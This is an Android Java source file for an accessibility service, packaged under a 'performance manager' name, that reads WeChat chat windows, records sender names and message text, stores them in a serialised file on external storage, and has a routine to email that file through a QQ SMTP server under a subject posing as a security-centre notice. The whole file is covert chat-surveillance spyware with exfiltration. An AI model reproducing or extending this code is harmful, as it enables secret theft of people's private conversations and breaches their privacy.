package com.airness.performancemanager;

import android.accessibilityservice.AccessibilityService;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.widget.Toast;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;

public class MyAccessibilityService extends AccessibilityService {
    public static final String TAG="MyAccessibilityService";
    public static String FilePath= Environment.getExternalStorageDirectory()+"//data.dat";

    private String ChatName="";
    private String ChatRecord="";
    private String VideoSecond="";

    private static ArrayList<Chat> chatArrayList=null;
    private static int kase=0;

    private boolean flag=false;
    private static boolean mailSended=false;

    public MyAccessibilityService() {

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        //Log.d(TAG,"========================START=======================");
        //printEventLog(accessibilityEvent);
        int eventType=accessibilityEvent.getEventType();

        /*
        收到消息：事件源：android.widget.TextView
                  事件类型：TYPE_WINDOW_CONTENT_CHANGED
         */
        if(eventType==AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED){
            if(accessibilityEvent.getClassName().equals("android.widget.ListView")){
                if(!flag){
                    Log.d(TAG,"可能收到消息");
                    AccessibilityNodeInfo nodeInfo=getRootInActiveWindow();
                    //getReceiveMessage(accessibilityEvent.getSource());

                    String name=null;
                    String text=null;

                    for(AccessibilityNodeInfo info:nodeInfo.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/apr")){
                        Log.d("人名",info.getText().toString());
                        name=info.getText().toString();
                        break;
                    }
                    for(AccessibilityNodeInfo info:nodeInfo.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/apt")){
                        Log.d("聊天信息",info.getText().toString());
                        text=info.getText().toString();
                        break;
                    }
                    Chat chat=new Chat(name,text);
                    addChat(chat);
                    //flag=true;
                    if(kase>40){
                        try {
                            writeToFile();
                        } catch (IOException | ClassNotFoundException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }

        /*
        收到消息：
                事件源：ListView
                事件类型：TYPE_VIEW_SCROLLED
         */
        if(eventType==AccessibilityEvent.TYPE_VIEW_SCROLLED){
            if(accessibilityEvent.getClassName().equals("android.widget.ListView")){

            }
        }

        /*
        编辑消息：
                    事件源：android.widget.EditText
                    事件类型：TYPE_VIEW_TEXT_SELECTION_CHANGED
        发送消息：
                    事件源：android.widget.EditText
                    事件类型：TYPE_VIEW_TEXT_SELECTION_CHANGED
                    事件判断：EditText的text为空
                    之中会有一次TextView的 TYPE_WINDOW_CONTENT_CHANGED 事件
         */
        if(eventType==AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED){

        }

        /*
        打开窗口
                Source Class:com.tencent.mm.ui.LauncherUI

         */
        if(eventType==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){

            if(accessibilityEvent.getClassName().equals("com.tencent.mm.ui.LauncherUI")){

            }
        }





    }


    private void recycle(AccessibilityNodeInfo info){

        if(info==null){
            return;
        }
        if(info.getChildCount()==0){

        }else {
            for(int i=0;i<info.getChildCount();i++){
                AccessibilityNodeInfo obj=info.getChild(i);
                recycle(obj);
            }
        }
        if(info.getClassName()!=null){
            Log.d(TAG,"ClassName is :"+info.getClassName().toString());
        }
        if(info.getText()!=null){
            Log.d(TAG,"Text is :"+info.getText().toString());
        }
    }



    private void GetChatName(AccessibilityNodeInfo node) {
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo node1 = node.getChild(i);
            if(node1==null||node1.getClassName()==null){
                return;
            }
            if ("android.widget.ImageView".equals(node1.getClassName()) && node1.isClickable()) {
                //获取聊天对象,这里两个if是为了确定找到的这个ImageView是头像的
                if (!TextUtils.isEmpty(node1.getContentDescription())) {
                    ChatName = node1.getContentDescription().toString();
                    if (ChatName.contains("头像")) {
                        ChatName = ChatName.replace("头像", "");
                    }
                }

            }
            GetChatName(node1);
        }
    }



    public void GetChatRecord(AccessibilityNodeInfo node) {
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo nodeChild = node.getChild(i);

            if(nodeChild==null||nodeChild.getClassName()==null){
                return;
            }
            //聊天内容是:文字聊天(包含语音秒数)
            if ("android.widget.TextView".equals(nodeChild.getClassName()) && "android.widget.RelativeLayout".equals(nodeChild.getParent().getClassName().toString())) {
                if (!TextUtils.isEmpty(nodeChild.getText())) {
                    String RecordText = nodeChild.getText().toString();
                    //这里加个if是为了防止多次触发TYPE_VIEW_SCROLLED而打印重复的信息
                    if (!RecordText.equals(ChatRecord)) {
                        ChatRecord = RecordText;
                        //判断是语音秒数还是正常的文字聊天,语音的话秒数格式为5"
                        if (ChatRecord.contains("\"")) {
                            Toast.makeText(this, ChatName + "发了一条" + ChatRecord + "的语音", Toast.LENGTH_SHORT).show();

                            Log.e("WeChatLog",ChatName + "发了一条" + ChatRecord + "的语音");
                        } else {
                            //这里在加多一层过滤条件，确保得到的是聊天信息，因为有可能是其他TextView的干扰，例如名片等
                            if (nodeChild.isLongClickable()) {
                                Toast.makeText(this, ChatName + "：" + ChatRecord, Toast.LENGTH_SHORT).show();

                                Log.e("WeChatLog",ChatName + "：" + ChatRecord);
                            }

                        }
                        return;
                    }
                }
            }

            //聊天内容是:表情
            if ("android.widget.ImageView".equals(nodeChild.getClassName()) && "android.widget.LinearLayout".equals(nodeChild.getParent().getClassName().toString())) {
                Toast.makeText(this, ChatName+"发的是表情", Toast.LENGTH_SHORT).show();

                Log.e("WeChatLog",ChatName+"发的是表情");

                return;
            }

            //聊天内容是:图片
            if ("android.widget.ImageView".equals(nodeChild.getClassName())) {
                //安装软件的这一方发的图片（另一方发的暂时没实现）
                if("android.widget.FrameLayout".equals(nodeChild.getParent().getClassName().toString())){
                    if(!TextUtils.isEmpty(nodeChild.getContentDescription())){
                        if(nodeChild.getContentDescription().toString().contains("图片")){
                            Toast.makeText(this, ChatName+"发的是图片", Toast.LENGTH_SHORT).show();

                            Log.e("WeChatLog",ChatName+"发的是图片");
                        }
                    }
                }
            }

            //聊天内容是:小视频秒数,格式为00：00
            if ("android.widget.TextView".equals(nodeChild.getClassName()) && "android.widget.FrameLayout".equals(nodeChild.getParent().getClassName().toString())) {
                if (!TextUtils.isEmpty(nodeChild.getText())) {
                    String second = nodeChild.getText().toString().replace(":", "");
                    //正则表达式，确定是不是纯数字,并且做重复判断

                    if (second.matches("[0-9]+") && !second.equals(VideoSecond)) {
                        VideoSecond = second;
                        Toast.makeText(this, ChatName + "发了一段" + nodeChild.getText().toString() + "的小视频", Toast.LENGTH_SHORT).show();

                        Log.e("WeChatLog","发了一段" + nodeChild.getText().toString() + "的小视频");
                    }
                }

            }

            GetChatRecord(nodeChild);
        }
    }


    /**
     * 获取新消息
     * @param node
     */
    private void getReceiveMessage(AccessibilityNodeInfo node){
        if(node==null)
            return;
        printLog("||---------------------------------------");
        printLog(node.getClassName().toString());
        if(node.getText()!=null)
            printLog(node.getText().toString());
        if(node.getViewIdResourceName()!=null)
            printLog(node.getViewIdResourceName().toString());

        if(node.getClassName().equals("android.view.View")){
            if(node.getViewIdResourceName()!=null){
                printLog("View text is:"+node.getText()+"  ID is :"+node.getViewIdResourceName());
            }
        }
        printLog("---------------------------------------||");
        if(node.getChildCount()!=0){
            for(int i=0;i<node.getChildCount();i++){
                getReceiveMessage(node.getChild(i));
            }
        }

    }



    private void printEventLog(AccessibilityEvent event) {
        Log.i(TAG, "-------------------------------------------------------------");
        int eventType = event.getEventType(); //事件类型
        Log.i(TAG, "PackageName:" + event.getPackageName() + ""); // 响应事件的包名
        Log.i(TAG, "Source Class:" + event.getClassName() + ""); // 事件源的类名
        Log.i(TAG, "Description:" + event.getContentDescription()+ ""); // 事件源描述
        Log.i(TAG, "Event Type(int):" + eventType + "");

        switch (eventType) {
            case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:// 通知栏事件
                Log.i(TAG, "event type:TYPE_NOTIFICATION_STATE_CHANGED");
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED://窗体状态改变
                Log.i(TAG, "event type:TYPE_WINDOW_STATE_CHANGED");
                break;
            case AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED://View获取到焦点
                Log.i(TAG, "event type:TYPE_VIEW_ACCESSIBILITY_FOCUSED");
                break;
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_START:
                Log.i(TAG, "event type:TYPE_VIEW_ACCESSIBILITY_FOCUSED");
                break;
            case AccessibilityEvent.TYPE_GESTURE_DETECTION_END:
                Log.i(TAG, "event type:TYPE_GESTURE_DETECTION_END");
                break;
            case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                Log.i(TAG, "event type:TYPE_WINDOW_CONTENT_CHANGED");
                break;
            case AccessibilityEvent.TYPE_VIEW_CLICKED:
                Log.i(TAG, "event type:TYPE_VIEW_CLICKED");
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                Log.i(TAG, "event type:TYPE_VIEW_TEXT_CHANGED");
                break;
            case AccessibilityEvent.TYPE_VIEW_SCROLLED:
                Log.i(TAG, "event type:TYPE_VIEW_SCROLLED");
                break;
            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
                Log.i(TAG, "event type:TYPE_VIEW_TEXT_SELECTION_CHANGED");
                break;
            default:
                Log.i(TAG, "no listen event");
        }

        for (CharSequence txt : event.getText()) {
            Log.i(TAG, "text:" + txt);
        }
        //recycle(getRootInActiveWindow());

        Log.i(TAG, "-------------------------------------------------------------");
    }


    @Override
    public void onInterrupt() {

    }

    private static void printLog(String text){
        Log.d(TAG,text);
    }

    /*
        把服务读到的记录全部储存在文件中
     */
    public static void writeToFile() throws IOException ,ClassNotFoundException{
        File file=new File(MyAccessibilityService.FilePath);
        ArrayList<Chat> list;
        if(mailSended&&file.exists()){
            file.delete();
            mailSended=false;
        }
        if(file.exists()){


            //读取添加
            list=(ArrayList<Chat>) MyAccessibilityService.readFile(file);

            for (Chat chat:chatArrayList)
                list.add(chat);

            //转存
            writeFile(file,list);
        }else {
            file.createNewFile();

            writeFile(file,chatArrayList);
        }
        //释放储存的list
        chatArrayList=null;
        printLog("文件储存成功："+file.getAbsolutePath());
    }


    public static void sendMessage() throws Exception{

        File file=new File(FilePath);
        if(file.exists()){

            EmailInfo emailInfo =new EmailInfo();
            emailInfo.setMailServerHost("smtp.qq.com");
            emailInfo.setMailServerPort("25");
            emailInfo.setValidate(true);
            emailInfo.setUserName("");
            emailInfo.setPassword("");
            emailInfo.setFromAddress("");
            emailInfo.setToAddress("");
            emailInfo.setSubject("An安全中心对象序列化通知");

            MailSender mailSender=new MailSender();
            mailSender.sendTextMail(emailInfo);
            mailSended=true;
        }


    }




    private static Object readFile(File file){
        try {
            FileInputStream inputStream=new FileInputStream(file);
            ObjectInputStream osi=new ObjectInputStream(inputStream);

            Object object=osi.readObject();

            inputStream.close();
            osi.close();

            return object;
        }catch (IOException | ClassNotFoundException e){
            Log.e(TAG,e.toString());
        }
        return null;
    }


    private static void writeFile(File file,Object object) throws IOException {
        FileOutputStream outputStream=new FileOutputStream(file);
        ObjectOutputStream oos=new ObjectOutputStream(outputStream);

        oos.writeObject(object);

        outputStream.close();
        oos.close();
    }

    private static void addChat(Chat chat){
        if(chatArrayList==null){
            chatArrayList=new ArrayList<>();
        }
        if(chatArrayList.size()>0){
            if(chatArrayList.get(chatArrayList.size()-1).equals(chat)){
                return;
            }
        }
        chatArrayList.add(chat);
        kase++;
    }


}
